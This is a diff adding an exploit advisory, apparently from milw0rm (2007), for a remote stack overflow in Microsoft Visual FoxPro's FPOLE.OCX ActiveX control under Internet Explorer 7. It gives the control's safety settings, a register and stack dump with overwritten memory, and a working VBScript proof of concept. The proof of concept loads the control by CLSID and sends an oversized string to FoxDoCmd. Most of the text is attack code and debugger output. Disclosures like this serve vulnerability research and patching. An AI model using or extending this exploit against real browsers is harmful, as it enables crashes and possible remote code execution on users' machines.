@@ -1,0 +1,61 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------------------------------------
+ <b>0-day: Microsoft Visual FoxPro 6.0 fpole 1.0 Type Library (FPOLE.OCX v. 6.0.8450.0) Remote Stack Overflow</b>
+ url: http://www.microsoft.com
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+
+ This control is marked as:
+ <b>RegKey Safe for Script: Falso
+ RegKey Safe for Init: Falso
+ Implements IObjectSafety: Vero
+ IDisp Safe:  Safe for untrusted: caller  
+ KillBitSet: Falso</b>
+
+ This is a dump:
+ <b>registers:
+
+ EAX 000287C4
+ ECX 017923C8
+ EDX 017FC60D ASCII "bbbbbbbbbbbb..."
+ EBX 04E51ED8
+ ESP 017FC3C0
+ EBP 017FC5FC
+ ESI 000493E1
+ EDI 7C80BDB6 kernel32.lstrlenA
+
+ EIP 04E46807 FPOLE.04E46807
+ 
+ *********************************************
+
+ stack:
+ [...]
+ 017FC60C  |62626262
+ 017FC610  |62626262
+ 017FC614  |62626262
+ 017FC618  |62626262
+ 017FC61C  |62626262
+ [...]</b>
+ 
+ so I think code execution is possible even if, in this moment of my life, I really have no time to
+ investigate :)
+-----------------------------------------------------------------------------------------------------------
+
+<object classid='clsid:EF28418F-FFB2-11D0-861A-00A0C903A97F' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language = 'vbscript'>
+ Sub tryMe()
+  buff = String(300000, "b")
+  test.FoxDoCmd buff, 1
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-09-06]
